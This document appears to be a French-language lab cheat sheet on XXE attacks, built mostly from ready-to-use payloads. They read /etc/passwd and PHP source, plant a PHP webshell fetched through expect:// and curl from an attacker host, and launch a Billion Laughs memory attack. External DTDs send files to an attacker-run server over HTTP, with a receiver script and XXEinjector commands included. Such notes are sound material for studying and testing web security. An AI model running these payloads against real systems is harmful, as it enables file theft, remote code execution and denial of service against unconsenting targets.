# XXE – Local File Disclosure

## 1. Identification

### Exemple de requête interceptée
```
POST /submitDetails.php
Content-Type: application/xml

<root>
  <name>Amy</name>
  <tel>123</tel>
  <email>email@xxe.htb</email>
  <message>Hello</message>
</root>
```

➡️ La valeur de `<email>` est reflétée dans la réponse → surface d’injection XXE.

## 2. Test d’injection simple

```
<!DOCTYPE email [
  <!ENTITY company "Inlane Freight">
]>
<root>
  <name>Amy</name>
  <tel>123</tel>
  <email>&company;</email>
  <message>Hello</message>
</root>
```

Réponse : `Check your email Inlane Freight for further instructions.`  
✅ Confirme l’injection XXE.

## 3. Lecture de fichiers locaux

```
<!DOCTYPE email [
  <!ENTITY company SYSTEM "file:///etc/passwd">
]>
<root>
  <name>Amy</name>
  <tel>123</tel>
  <email>&company;</email>
  <message>Hello</message>
</root>
```

➡️ Retourne le contenu de `/etc/passwd`.

## 4. Lecture de code source (PHP wrapper)

```
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
<root>
  <name>Amy</name>
  <tel>123</tel>
  <email>&company;</email>
  <message>Hello</message>
</root>
```

➡️ Retourne le contenu **base64** de `index.php`.  
Décoder avec Burp ou `base64 -d`.

## 5. Remote Code Execution (si `expect://` activé)

### Déployer un webshell
```
echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
sudo python3 -m http.server 80
```

### Injection XXE pour fetch le shell
```
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
]>
<root>
  <name></name>
  <tel></tel>
  <email>&company;</email>
  <message></message>
</root>
```

➡️ `shell.php` téléchargé → accès RCE via `?cmd=id`.

## 6. Autres attaques XXE

### SSRF
Utiliser `SYSTEM "http://127.0.0.1:8080/admin"` pour scanner ports ou intranet.

### DOS (Billion Laughs Attack)
```
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY a0 "DOS">
  <!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
  <!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
  <!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
  <!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
  <!ENTITY a5 "&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;">
  <!ENTITY a6 "&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;">
  <!ENTITY a7 "&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;">
  <!ENTITY a8 "&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;">
  <!ENTITY a9 "&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;">
  <!ENTITY a10 "&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;">
]>
<root>
  <name></name>
  <tel></tel>
  <email>&a10;</email>
  <message></message>
</root>
```

➡️ Saturation mémoire (souvent patché sur serveurs modernes).

## 🔑 Points clés
- Chercher les endpoints XML (`Content-Type: application/xml`).  
- Vérifier les éléments reflétés (ex: `<email>`).  
- Utiliser `file://` pour lire, `php://filter/` pour encoder, `expect://` pour exécuter.  
- XXE peut → **LFI, SSRF, RCE, DOS**.

---

# Advanced File Disclosure

## 1. Advanced Exfiltration avec CDATA

### Problème  
- Certains fichiers ne passent pas en XML brut.  
- On peut contourner ça avec `<![CDATA[ ... ]]>`.  
- Limite : XML interdit de combiner interne + externe → on utilise **Parameter Entities** via un DTD externe.

### Étapes
Créer `xxe.dtd` localement :
```
<!ENTITY joined "%begin;%file;%end;">
```

Héberger le DTD :
```
echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
python3 -m http.server 8000
```

Payload côté cible :
```
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA[">
  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php">
  <!ENTITY % end "]]>">
  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %xxe;
]>
<root>
  <email>&joined;</email>
</root>
```

➡️ Retourne le contenu brut de `submitDetails.php`.

## 2. Error-Based XXE

### Contexte  
- Aucun output direct disponible.  
- On force l’application à générer une **erreur** → fuite du contenu.

### DTD malveillant (hébergé en local)
```
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
```

### Payload côté cible
```
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %error;
]>
```

➡️ Le serveur renvoie une erreur contenant le contenu de `/etc/hosts`.  
➡️ Peut être adapté à n’importe quel fichier source (`/var/www/html/file.php`, etc.).

## 3. Notes & Limitations
- **CDATA trick** : utile pour binaires, caractères spéciaux.  
- **Error-based** : limité par taille/format, mais efficace si logs ou erreurs visibles.  
- Peut révéler chemins système (utile pour cibler d’autres fichiers).  
- Ces techniques complètent les attaques classiques **file://** et **php://filter/**.

## 🔑 Points clés
- Héberger DTD externe sur votre serveur → exfiltration.  
- Utiliser `%parameterEntities;` pour combiner plusieurs entités.  
- Exploiter erreurs PHP/XML pour forcer la fuite.  

---

# Blind Data Exfiltration

## 1. OOB (Out-of-Band) Exfiltration

### Idée
- Quand rien n’est affiché (ni XML, ni erreurs).  
- On force la cible à **faire une requête vers notre serveur** contenant le fichier exfiltré.  
- On encode en base64 pour éviter les erreurs XML.

### DTD malveillant
```
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
```

### Serveur de réception
`index.php` sur notre machine :
```php
<?php
if(isset($_GET['content'])){
    error_log("\n\n" . base64_decode($_GET['content']));
}
?>
```

Lancer serveur PHP :
```
php -S 0.0.0.0:8000
```

### Payload côté cible
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>&content;</root>
```

➡️ La cible fait une requête HTTP → notre serveur reçoit et décode le contenu (`/etc/passwd`, etc.).

## 2. Variante DNS Exfiltration
- Encoder les données comme **sous-domaine** :  
  `ENCODEDTEXT.our.domain.com`  
- Utiliser `tcpdump` ou DNS logs pour capturer & décoder.

## 3. Automatisation avec XXEinjector

### Installation
```
git clone https://github.com/enjoiz/XXEinjector.git
```

### Préparer une requête brute
Fichier `/tmp/xxe.req` :
```
POST /blind/submitDetails.php HTTP/1.1
Host: TARGET_IP
Content-Type: text/plain;charset=UTF-8

<?xml version="1.0" encoding="UTF-8"?>
XXEINJECT
```

### Lancer l’outil
```
ruby XXEinjector.rb \
  --host=OUR_IP --httpport=8000 \
  --file=/tmp/xxe.req \
  --path=/etc/passwd \
  --oob=http --phpfilter
```

➡️ Les fichiers exfiltrés sont stockés dans `Logs/target_ip/...`

## 🔑 Points clés
- **Blind XXE** = pas de retour → utiliser OOB HTTP/DNS.  
- **PHP filter + base64** garantit un contenu exploitable.  
- **XXEinjector** simplifie et automatise toutes les étapes.  

Ressources : 
- [XXEinjector](https://github.com/enjoiz/XXEinjector)






